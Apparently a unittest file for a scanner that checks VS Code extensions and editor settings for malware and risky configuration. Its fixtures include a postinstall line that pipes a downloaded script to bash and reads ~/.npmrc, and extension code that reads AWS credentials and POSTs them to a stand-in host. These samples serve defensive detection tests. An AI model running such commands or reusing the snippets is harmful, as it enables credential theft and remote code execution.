from __future__ import annotations

import hashlib
import json
import unittest
import zipfile
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest.mock import patch

from ide_scanner.discovery import discover_from_path
from ide_scanner.cli import _run_benchmark
from ide_scanner.posture import scan_posture, summarize_posture
from ide_scanner.registry import _marketplace_metadata_findings, _repository_metadata_findings
from ide_scanner.report_bundle import build_report_bundle, iter_report_events, write_report_bundle
from ide_scanner.sandbox_runner import run_sandbox
from ide_scanner.scanner import scan_extension, scan_targets


class ScannerTests(unittest.TestCase):
    def test_posture_detects_risky_client_setup(self) -> None:
        with TemporaryDirectory() as tmp:
            home = Path(tmp)
            user = home / ".config" / "Code" / "User"
            user.mkdir(parents=True)
            (user / "settings.json").write_text(
                """
                {
                  "security.workspace.trust.enabled": false,
                  "task.allowAutomaticTasks": "on",
                  "chat.tools.global.autoApprove": true,
                  "chat.tools.terminal.ignoreDefaultAutoApproveRules": true,
                  "chat.tools.terminal.autoApprove": {"curl *": true},
                  "chat.tools.urls.autoApprove": {"*": true},
                  "extensions.supportUntrustedWorkspaces": {
                    "unknown.helper": {"supported": true}
                  }
                }
                """,
                encoding="utf-8",
            )
            extensions_root = home / ".vscode" / "extensions"
            extension = extensions_root / "unknown.helper-1.0.0"
            extension.mkdir(parents=True)
            (extension / "package.json").write_text(
                """
                {
                  "publisher": "unknown",
                  "name": "helper",
                  "version": "1.0.0",
                  "activationEvents": ["onStartupFinished"],
                  "contributes": {"languageModelTools": [{"name": "run"}]}
                }
                """,
                encoding="utf-8",
            )
            (extensions_root / "extensions.json").write_text(
                """
                [{
                  "identifier": {"id": "unknown.helper"},
                  "version": "1.0.0",
                  "relativeLocation": "unknown.helper-1.0.0",
                  "metadata": {"source": "vsix"}
                }]
                """,
                encoding="utf-8",
            )

            metrics = scan_posture(home)
            summary = summarize_posture(metrics)

        by_id = {metric.id: metric for metric in metrics}
        self.assertEqual(summary["status"], "failure")
        self.assertGreaterEqual(summary["score"], 70)
        self.assertEqual(by_id["workspace-trust"].status, "failure")
        self.assertEqual(by_id["agent-global-auto-approve"].status, "failure")
        self.assertEqual(by_id["terminal-auto-approve"].status, "failure")
        self.assertEqual(by_id["url-auto-approve"].status, "failure")
        self.assertEqual(by_id["extension-trust-overrides"].status, "failure")
        self.assertEqual(by_id["sideloaded-extensions"].status, "failure")
        self.assertEqual(by_id["extension-startup"].status, "warning")
        self.assertEqual(by_id["agentic-extensions"].status, "warning")

    def test_fixture_scan_classifies_extensions(self) -> None:
        report = scan_targets(include_fixtures=True)
        self.assertEqual(report["summary"]["total_extensions"], 8)
        self.assertIn("posture_summary", report)
        self.assertIn("posture_score", report["summary"])
        by_id = {extension["extension_id"]: extension for extension in report["extensions"]}

        self.assertEqual(by_id["trusted.trusted-formatter"]["verdict"], "clean")
        self.assertEqual(by_id["trusted.startup-theme"]["verdict"], "clean")
        self.assertEqual(by_id["knownbad.feed-hit"]["verdict"], "clean")
        self.assertEqual(by_id["unknown.dropper"]["verdict"], "suspicious")
        self.assertEqual(by_id["example.mutable-dependency"]["verdict"], "review")
        self.assertEqual(by_id["example.native-artifact"]["verdict"], "review")

        suspicious = by_id["unknown.shadow-helper"]
        self.assertEqual(suspicious["verdict"], "suspicious")
        self.assertEqual(suspicious["severity"], "HIGH")
        self.assertGreater(suspicious["malware_score"], 0)
        self.assertIn("credential-exfiltration-chain", {finding["rule_id"] for finding in suspicious["findings"]})

        agent = by_id["example.agent-toolbox"]
        self.assertEqual(agent["verdict"], "review")
        self.assertEqual(agent["malware_score"], 0)
        self.assertGreater(agent["risk_score"], 0)
        self.assertIn("agentic-tooling", {finding["rule_id"] for finding in agent["findings"]})

    def test_report_bundle_splits_summary_leaderboard_and_details(self) -> None:
        report = scan_targets(include_fixtures=True)
        bundle = build_report_bundle(report, profile="smart", source="fixtures")

        self.assertEqual(bundle["metadata"]["schema_version"], "2.0")
        self.assertEqual(bundle["metadata"]["profile"], "smart")
        self.assertEqual(bundle["metadata"]["source"], "fixtures")
        self.assertEqual(bundle["summary"]["summary"]["total_extensions"], 8)
        self.assertEqual(bundle["summary"]["summary"]["suspicious"], 2)
        self.assertIn("rules", bundle["rules"])

        rows = bundle["leaderboard"]["extensions"]
        self.assertEqual(len(rows), 8)
        self.assertTrue(all("detail_ref" in row for row in rows))
        suspicious = next(row for row in rows if row["extension_id"] == "unknown.shadow-helper")
        self.assertEqual(suspicious["grade"], "D")
        self.assertIn("credential-exfiltration-chain", suspicious["top_findings"])

        detail = bundle["extensions"][suspicious["detail_ref"]]
        self.assertEqual(detail["extension_id"], "unknown.shadow-helper")
        self.assertIn("score_explanation", detail)
        self.assertIn("recommendations", detail)
        self.assertTrue(detail["evidence"])
        self.assertIn("evidence_refs", detail["findings"][0])
        self.assertNotIn("evidence", detail["findings"][0])

    def test_write_report_bundle_creates_dashboard_ready_zip(self) -> None:
        with TemporaryDirectory() as tmp:
            report = scan_targets(paths=[Path("fixtures") / "credential-exfil"])
            output = Path(tmp) / "report.zip"
            receipt = write_report_bundle(report, output, profile="standard", source="folder")

            self.assertEqual(receipt["output"], str(output))
            with zipfile.ZipFile(output) as archive:
                names = set(archive.namelist())
                self.assertIn("metadata.json", names)
                self.assertIn("summary.json", names)
                self.assertIn("leaderboard.json", names)
                self.assertIn("posture.json", names)
                self.assertIn("rules.json", names)
                detail_names = [name for name in names if name.startswith("extensions/")]
                self.assertEqual(len(detail_names), 1)
                metadata = json.loads(archive.read("metadata.json"))
                leaderboard = json.loads(archive.read("leaderboard.json"))

        self.assertEqual(metadata["profile"], "standard")
        self.assertEqual(metadata["source"], "folder")
        self.assertEqual(leaderboard["extensions"][0]["detail_ref"], detail_names[0])

    def test_report_stream_events_include_summary_and_detail_refs(self) -> None:
        report = scan_targets(paths=[Path("fixtures") / "credential-exfil"])
        events = list(iter_report_events(report, profile="smart", source="folder", output="report.zip"))

        self.assertEqual(events[0]["type"], "scan_started")
        self.assertEqual(events[0]["total_extensions"], 1)
        self.assertIn("extension_summary_ready", {event["type"] for event in events})
        self.assertIn("extension_detail_ready", {event["type"] for event in events})
        self.assertEqual(events[-1]["type"], "scan_completed")
        self.assertEqual(events[-1]["output"], "report.zip")
        summary = next(event for event in events if event["type"] == "extension_summary_ready")
        self.assertEqual(summary["extension_id"], "unknown.shadow-helper")
        self.assertEqual(summary["verdict"], "suspicious")
        self.assertTrue(summary["detail_ref"].startswith("extensions/"))

    def test_path_discovery_finds_fixture_extensions(self) -> None:
        targets = discover_from_path(Path("fixtures"))
        self.assertEqual(len(targets), 8)

    def test_benchmark_uses_known_malicious_feed_fixture(self) -> None:
        result = _run_benchmark()
        by_id = {row["extension_id"]: row for row in result["rows"]}
        self.assertEqual(result["total"], 8)
        self.assertEqual(by_id["knownbad.feed-hit"]["expected_verdict"], "malicious")
        self.assertEqual(by_id["knownbad.feed-hit"]["actual_verdict"], "malicious")
        self.assertEqual(result["false_negative"], 0)

    def test_discovery_finds_vsix_files(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            vsix = root / "example.vsix"
            with zipfile.ZipFile(vsix, "w") as archive:
                archive.writestr("extension/package.json", '{"publisher":"example","name":"vsix","version":"1.0.0"}')

            targets = discover_from_path(root)

        self.assertEqual(targets, [{"type": "vsix", "path": str(vsix.resolve())}])

    def test_registry_finding_moves_clean_extension_to_review(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "trusted.trusted-formatter",
                "severity": "MEDIUM",
                "confidence": 0.58,
                "category": "dependency",
                "rule_id": "vulnerable-npm-dependency",
                "evidence_summary": "example@1.0.0 has 1 OSV finding(s). Version match: range-derived.",
                "evidence": {"package": "example", "version": "1.0.0", "exact": False, "osv_ids": ["GHSA-test"]},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(include_fixtures=True, online=True)

        by_id = {extension["extension_id"]: extension for extension in report["extensions"]}
        formatter = by_id["trusted.trusted-formatter"]
        self.assertEqual(formatter["verdict"], "review")
        self.assertEqual(formatter["severity"], "MEDIUM")
        self.assertEqual(formatter["malware_score"], 0)
        self.assertGreater(formatter["risk_score"], 0)
        self.assertIn("vulnerable-npm-dependency", {finding["rule_id"] for finding in formatter["findings"]})

    def test_registry_only_extension_id_can_be_marked_malicious(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "bad.bad-extension",
                "severity": "CRITICAL",
                "confidence": 0.96,
                "category": "registry",
                "rule_id": "marketplace-removed-package",
                "evidence_summary": "Extension appears in Microsoft's removed package list as Malware.",
                "evidence": {"date": "1/1/2026", "type": "Malware"},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(extension_ids=["bad.bad-extension"], online=True)

        extension = report["extensions"][0]
        self.assertEqual(extension["source"], "registry-id")
        self.assertEqual(extension["verdict"], "malicious")
        self.assertEqual(extension["malware_authority"], "authoritative")
        self.assertEqual(extension["malware_score"], 100)
        self.assertEqual(extension["findings"][0]["evidence"]["evidence_class"], "confirmed")

    def test_non_malware_marketplace_removal_is_not_authoritative_malware(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "removed.impersonator",
                "severity": "HIGH",
                "confidence": 0.9,
                "category": "registry",
                "rule_id": "marketplace-removed-package",
                "evidence_summary": "Extension appears in Microsoft's removed package list as Impersonation.",
                "evidence": {"date": "1/1/2026", "type": "Impersonation"},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(extension_ids=["removed.impersonator"], online=True)

        extension = report["extensions"][0]
        self.assertEqual(extension["verdict"], "review")
        self.assertEqual(extension["malware_authority"], "none")
        self.assertEqual(extension["malware_score"], 0)
        self.assertGreaterEqual(extension["risk_score"], 80)
        self.assertEqual(extension["severity"], "HIGH")
        self.assertEqual(extension["score_details"]["basis"], "provenance")
        self.assertEqual(extension["findings"][0]["evidence"]["evidence_class"], "provenance")

    def test_suspicious_marketplace_removal_is_suspicious_not_authoritative(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "removed.suspicious",
                "severity": "CRITICAL",
                "confidence": 0.96,
                "category": "registry",
                "rule_id": "marketplace-removed-package",
                "evidence_summary": "Extension appears in Microsoft's removed package list as Suspicious.",
                "evidence": {"date": "1/1/2026", "type": "Suspicious"},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(extension_ids=["removed.suspicious"], online=True)

        extension = report["extensions"][0]
        self.assertEqual(extension["verdict"], "suspicious")
        self.assertEqual(extension["malware_authority"], "non_authoritative")
        self.assertEqual(extension["malware_score"], 0)
        self.assertGreaterEqual(extension["risk_score"], 88)

    def test_marketplace_reputation_only_does_not_move_clean_extension_to_review(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "trusted.trusted-formatter",
                "severity": "LOW",
                "confidence": 0.46,
                "category": "reputation",
                "rule_id": "marketplace-unverified-publisher",
                "evidence_summary": "Marketplace metadata does not report a verified publisher.",
                "evidence": {"publisher_verified": False, "install_count": 10},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(include_fixtures=True, online=True)

        formatter = {extension["extension_id"]: extension for extension in report["extensions"]}["trusted.trusted-formatter"]
        self.assertEqual(formatter["verdict"], "clean")
        self.assertEqual(formatter["malware_score"], 0)
        self.assertEqual(formatter["risk_score"], 0)
        self.assertEqual(formatter["findings"][0]["evidence"]["evidence_class"], "reputation")
        self.assertEqual(formatter["score_details"]["components"]["reputation"], 8)

    def test_verified_publisher_is_reported_as_suppressor_only(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "example.agent-toolbox",
                "severity": "INFO",
                "confidence": 0.95,
                "category": "reputation",
                "rule_id": "marketplace-verified-publisher",
                "evidence_summary": "Marketplace metadata reports a verified publisher.",
                "evidence": {"publisher_verified": True, "install_count": 100000},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(include_fixtures=True, online=True)

        agent = {extension["extension_id"]: extension for extension in report["extensions"]}["example.agent-toolbox"]
        self.assertEqual(agent["verdict"], "review")
        self.assertEqual(agent["malware_score"], 0)
        self.assertIn("verified-publisher", {item["id"] for item in agent["score_details"]["suppressors"]})

    def test_marketplace_metadata_findings_are_contextual(self) -> None:
        findings = _marketplace_metadata_findings("example.low", {
            "extension_id": "example.low",
            "found": True,
            "publisher_verified": False,
            "install_count": 5,
            "rating_average": 2.0,
            "rating_count": 8,
            "last_updated": "2020-01-01T00:00:00Z",
        })

        rule_ids = {finding["rule_id"] for finding in findings}
        self.assertIn("marketplace-unverified-publisher", rule_ids)
        self.assertIn("marketplace-low-install-count", rule_ids)
        self.assertIn("marketplace-low-rating", rule_ids)
        self.assertIn("marketplace-stale-extension", rule_ids)

    def test_name_impersonation_metric_is_reputation_context(self) -> None:
        findings = _marketplace_metadata_findings("random.chatgpt", {
            "extension_id": "random.chatgpt",
            "found": True,
            "publisher": "random",
            "publisher_verified": False,
            "extension_name": "chatgpt",
            "display_name": "ChatGPT",
            "install_count": 12,
            "rating_average": 0,
            "rating_count": 0,
        })

        impersonation = [finding for finding in findings if finding["rule_id"] == "marketplace-name-impersonation"]
        self.assertEqual(len(impersonation), 1)
        self.assertEqual(impersonation[0]["category"], "reputation")

    def test_repository_metadata_is_reputation_context(self) -> None:
        findings = _repository_metadata_findings("example.repo", {
            "repository": "https://github.com/example/repo",
            "found": True,
            "host": "github",
            "full_name": "example/repo",
            "archived": True,
            "disabled": False,
            "pushed_at": "2020-01-01T00:00:00Z",
        })

        self.assertIn("repo-archived", {finding["rule_id"] for finding in findings})
        self.assertIn("repo-stale", {finding["rule_id"] for finding in findings})
        self.assertTrue(all(finding["category"] == "reputation" for finding in findings))

    def test_dev_dependencies_are_not_report_dependencies(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"dev-only","version":"1.0.0",'
                '"devDependencies":{"webpack":"5.75.0"}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.dependencies, {})

    def test_package_lock_resolves_exact_runtime_dependencies(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"locked","version":"1.0.0",'
                '"dependencies":{"left-pad":"^1.0.0"}}',
                encoding="utf-8",
            )
            (root / "package-lock.json").write_text(
                '{"lockfileVersion":3,"packages":{'
                '"":{"dependencies":{"left-pad":"^1.0.0"}},'
                '"node_modules/left-pad":{"version":"1.3.0"},'
                '"node_modules/transitive":{"version":"2.4.0"},'
                '"node_modules/dev-only":{"version":"9.9.9","dev":true}'
                '}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.dependencies["left-pad"], "1.3.0")
        self.assertEqual(report.dependencies["transitive"], "2.4.0")
        self.assertNotIn("dev-only", report.dependencies)

    def test_node_modules_resolves_manifest_range_when_no_lockfile_exists(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"installed","version":"1.0.0",'
                '"dependencies":{"@scope/pkg":"^2.0.0"}}',
                encoding="utf-8",
            )
            installed = root / "node_modules" / "@scope" / "pkg"
            installed.mkdir(parents=True)
            (installed / "package.json").write_text('{"name":"@scope/pkg","version":"2.1.5"}', encoding="utf-8")

            report = scan_extension(root)

        self.assertEqual(report.dependencies["@scope/pkg"], "2.1.5")

    def test_mutable_and_unpinned_dependency_sources_are_review_not_malware(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"deps","version":"1.0.0",'
                '"dependencies":{"floating":"latest","remote":"git+https://github.com/example/pkg.git"}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "review")
        self.assertEqual(report.malware_score, 0)
        self.assertGreater(report.risk_score, 0)
        self.assertIn("unpinned-dependency", {finding.rule_id for finding in report.findings})
        self.assertIn("mutable-dependency-source", {finding.rule_id for finding in report.findings})

    def test_install_time_chains_are_suspicious(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"installer","version":"1.0.0",'
                '"scripts":{"postinstall":"curl https://example.com/payload.sh | bash && cat ~/.npmrc"}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.malware_authority, "non_authoritative")
        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("install-download-execute", rule_ids)
        self.assertIn("install-secret-access", rule_ids)
        self.assertIn("install-shell-obfuscation", rule_ids)

    def test_agent_tool_schema_metrics_are_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"agentic","version":"1.0.0",'
                '"contributes":{"languageModelTools":[{"name":"runCommand","description":"execute shell command and read workspace files via https url"}]}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "review")
        self.assertEqual(report.malware_score, 0)
        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("agent-shell-tool", rule_ids)
        self.assertIn("agent-filesystem-tool", rule_ids)
        self.assertIn("agent-network-tool", rule_ids)

    def test_startup_activation_alone_is_context_not_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"startup-theme","version":"1.0.0",'
                '"activationEvents":["onStartupFinished"],"contributes":{"themes":[]}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.malware_score, 0)
        self.assertEqual(report.risk_score, 0)
        self.assertEqual(report.score_details["risk_score"], 0)
        self.assertEqual(report.score_details["basis"], "none")
        self.assertIn("startup-activation", {finding.rule_id for finding in report.findings})

    def test_dangerous_repository_workflow_is_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            workflows = root / ".github" / "workflows"
            workflows.mkdir(parents=True)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"workflow","version":"1.0.0","repository":"https://github.com/example/workflow"}',
                encoding="utf-8",
            )
            (workflows / "ci.yml").write_text(
                "on: pull_request_target\npermissions: write-all\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "review")
        self.assertIn("dangerous-github-workflow", {finding.rule_id for finding in report.findings})

    def test_sandbox_observations_are_imported_as_suspicious(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            extension = root / "observed"
            extension.mkdir()
            (extension / "package.json").write_text(
                '{"publisher":"example","name":"observed","version":"1.0.0"}',
                encoding="utf-8",
            )
            observations = root / "observations.json"
            observations.write_text(
                '{"extensions":{"example.observed":[{"kind":"secret_exfil","destination":"https://example.com"}]}}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[root], sandbox_observations_file=observations)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["verdict"], "suspicious")
        self.assertEqual(scanned["malware_authority"], "non_authoritative")
        self.assertIn("observed-secret-exfil", {finding["rule_id"] for finding in scanned["findings"]})

    def test_artifact_inventory_flags_native_and_packed_artifacts(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"artifacts","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "server.node").write_bytes(b"native")
            (root / "payload.zip").write_bytes(b"packed")

            report = scan_extension(root)

        self.assertEqual(report.verdict, "review")
        self.assertEqual(report.malware_score, 0)
        self.assertGreater(report.risk_score, 0)
        self.assertEqual(report.artifact_inventory["files_hashed"], 3)
        self.assertEqual(len(report.artifact_inventory["risky_artifacts"]), 2)
        self.assertIn("native-or-packed-artifact", {finding.rule_id for finding in report.findings})
        self.assertIn("packed-artifact", {finding.rule_id for finding in report.findings})

    def test_known_bad_hash_feed_is_authoritative_malware(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            extension = root / "bad-extension"
            extension.mkdir()
            (extension / "package.json").write_text(
                '{"publisher":"bad","name":"extension","version":"1.0.0"}',
                encoding="utf-8",
            )
            payload = b"known bad payload"
            (extension / "extension.js").write_bytes(payload)
            digest = hashlib.sha256(payload).hexdigest()
            feed = root / "known-bad.json"
            feed.write_text(
                '{"hashes":[{"sha256":"' + digest + '","source":"unit-test","classification":"malware"}]}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[root], known_bad_hashes_file=feed)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["verdict"], "malicious")
        self.assertEqual(scanned["malware_authority"], "authoritative")
        self.assertEqual(scanned["malware_score"], 100)
        self.assertIn("known-bad-artifact", {finding["rule_id"] for finding in scanned["findings"]})

    def test_threat_feed_extension_id_is_authoritative_malware(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            extension = root / "bad-extension"
            extension.mkdir()
            (extension / "package.json").write_text(
                '{"publisher":"bad","name":"extension","version":"1.0.0"}',
                encoding="utf-8",
            )
            feed = root / "threat-feed.json"
            feed.write_text(
                '{"extensions":[{"extension_id":"bad.extension","classification":"malware","source":"unit-test"}]}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[root], threat_feed_file=feed)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["verdict"], "malicious")
        self.assertEqual(scanned["malware_authority"], "authoritative")
        self.assertEqual(scanned["malware_score"], 100)
        self.assertIn("trusted-threat-feed-hit", {finding["rule_id"] for finding in scanned["findings"]})

    def test_vsix_is_scanned_in_quarantine_and_keeps_source_artifact_hash(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            vsix = root / "sample.vsix"
            with zipfile.ZipFile(vsix, "w") as archive:
                archive.writestr("extension/package.json", '{"publisher":"example","name":"vsix","version":"1.0.0"}')
                archive.writestr("extension/extension.js", "console.log('ok')")

            report = scan_targets(paths=[vsix])

        scanned = report["extensions"][0]
        self.assertEqual(scanned["source"], "vsix")
        self.assertEqual(scanned["install_path"], str(vsix.resolve()))
        self.assertEqual(scanned["verdict"], "clean")
        self.assertEqual(len(scanned["artifact_inventory"]["vsix_hash"]), 64)
        self.assertEqual(scanned["artifact_inventory"]["source_artifact"], "sample.vsix")
        self.assertEqual(scanned["artifact_inventory"]["vsix_signature"]["present"], False)

    def test_known_bad_vsix_hash_feed_is_authoritative_malware(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            vsix = root / "bad.vsix"
            with zipfile.ZipFile(vsix, "w") as archive:
                archive.writestr("extension/package.json", '{"publisher":"bad","name":"vsix","version":"1.0.0"}')
                archive.writestr("extension/extension.js", "console.log('payload')")
            digest = hashlib.sha256(vsix.read_bytes()).hexdigest()
            feed = root / "known-bad.json"
            feed.write_text(
                '{"hashes":[{"sha256":"' + digest + '","source":"unit-test","classification":"malware"}]}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[vsix], known_bad_hashes_file=feed)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["verdict"], "malicious")
        self.assertEqual(scanned["malware_authority"], "authoritative")
        self.assertEqual(scanned["malware_score"], 100)
        self.assertIn("known-bad-artifact", {finding["rule_id"] for finding in scanned["findings"]})

    def test_vendored_generated_code_does_not_drive_static_verdict(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"vendored","version":"1.0.0"}',
                encoding="utf-8",
            )
            vendored = root / "node_modules" / "pkg"
            vendored.mkdir(parents=True)
            (vendored / "index.js").write_text(
                "fetch('https://example.com'); require('child_process').exec('whoami'); eval('1')",
                encoding="utf-8",
            )
            py_vendor = root / "python_files" / "lib" / "pkg"
            py_vendor.mkdir(parents=True)
            (py_vendor / "module.py").write_text(
                "import subprocess\nsubprocess.Popen(['whoami'])\n__import__('os')\n",
                encoding="utf-8",
            )
            (root / "webview.min.js").write_text(
                "fetch('https://example.com'); require('child_process').exec('whoami'); eval('1')",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.malware_authority, "none")
        self.assertTrue(all(finding.evidence["evidence_class"] == "reputation" for finding in report.findings))

    def test_large_generated_bundle_does_not_create_correlated_chain(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"bundle","version":"1.0.0","main":"main.js"}',
                encoding="utf-8",
            )
            token_blob = (
                "process.env.SECRET_FILE; fetch('https://example.com'); spawn('x'); "
                "Buffer.from('abc','base64'); unlinkSync('x'); rmSync('x',{recursive:true}); "
            )
            (root / "main.js").write_text("var bundle=1;\n" * 35 + token_blob * 4000, encoding="utf-8")

            report = scan_extension(root)

        self.assertNotEqual(report.verdict, "suspicious")
        self.assertNotIn("download-and-execute", {finding.rule_id for finding in report.findings})
        self.assertNotIn("credential-exfiltration-chain", {finding.rule_id for finding in report.findings})

    def test_weak_standalone_static_indicator_stays_clean(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"weak","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text("const token = process.env.API_TOKEN;", encoding="utf-8")

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.malware_authority, "none")
        self.assertEqual(report.severity, "INFO")
        self.assertEqual(report.malware_score, 0)
        self.assertEqual(report.risk_score, 0)
        self.assertIn("weak", {finding.evidence["evidence_class"] for finding in report.findings})

    def test_correlated_static_chain_is_suspicious(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"chain","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs = require('fs'); const https = require('https');"
                "const secretPath = process.env.SECRET_FILE;"
                "const data = fs.readFileSync(secretPath); https.request('https://example.com').write(data);",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.malware_authority, "non_authoritative")
        self.assertGreater(report.malware_score, 0)
        self.assertGreaterEqual(report.risk_score, report.malware_score)
        self.assertIn("credential-exfiltration-chain", {finding.rule_id for finding in report.findings})

    def test_far_apart_static_tokens_do_not_create_correlated_chain(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"far-apart","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const token = process.env.API_TOKEN;\n"
                + "\n".join(f"const filler{i}=true;" for i in range(80))
                + "\nconst fs = require('fs'); fs.readFileSync('/tmp/example');\n"
                + "\n".join(f"const gap{i}=true;" for i in range(80))
                + "\nrequire('https').request('https://example.com').end();\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertNotEqual(report.verdict, "suspicious")
        self.assertNotIn("credential-exfiltration-chain", {finding.rule_id for finding in report.findings})

    def test_previous_report_deltas_are_reported_without_changing_verdict(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            extension = root / "current"
            extension.mkdir()
            (extension / "package.json").write_text(
                '{"publisher":"example","name":"delta","version":"2.0.0","dependencies":{"left-pad":"1.3.0"}}',
                encoding="utf-8",
            )
            previous = root / "previous.json"
            previous.write_text(
                '{"extensions":[{"extension_id":"example.delta","version":"1.0.0","verdict":"clean",'
                '"risk_score":0,"malware_score":0,"dependencies":{},"artifact_inventory":{"risky_artifacts":[]}}]}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[extension], previous_report_file=previous)

        self.assertEqual(report["extensions"][0]["verdict"], "clean")
        self.assertEqual(report["version_deltas"][0]["extension_id"], "example.delta")
        self.assertIn("version", report["version_deltas"][0]["changes"])
        self.assertIn("dependencies", report["version_deltas"][0]["changes"])
        self.assertTrue(report["human_summary"])

    def test_sandbox_runner_plan_does_not_execute_by_default(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"sandboxed","version":"1.0.0",'
                '"scripts":{"postinstall":"echo should-not-run"}}',
                encoding="utf-8",
            )

            observations = run_sandbox(root)

        self.assertEqual(observations["mode"], "plan-only")
        self.assertEqual(observations["plan"]["extension_id"], "example.sandboxed")
        self.assertEqual(len(observations["plan"]["commands"]), 1)
        self.assertEqual(observations["extensions"]["example.sandboxed"], [])

    def test_sandbox_runner_runtime_instrumentation_observes_secret_exfil(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"runtime","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs=require('fs'); const https=require('https');"
                "function activate(){"
                "const data=fs.readFileSync(process.env.HOME+'/.aws/credentials','utf8');"
                "const req=https.request('https://example.invalid/collect',{method:'POST'});"
                "req.write(data); req.end();"
                "}"
                "module.exports={activate};",
                encoding="utf-8",
            )

            observations = run_sandbox(root, allow_execute=True, timeout_seconds=5)

        items = observations["extensions"]["example.runtime"]
        self.assertIn("secret_read", {item["kind"] for item in items})
        self.assertIn("unexpected_network", {item["kind"] for item in items})
        self.assertIn("secret_exfil", {item["kind"] for item in items})

    def test_repo_binary_artifacts_metric_fires_for_committed_native_binary(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"native","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "server.node").write_bytes(b"native-binary-payload")

            report = scan_extension(root)

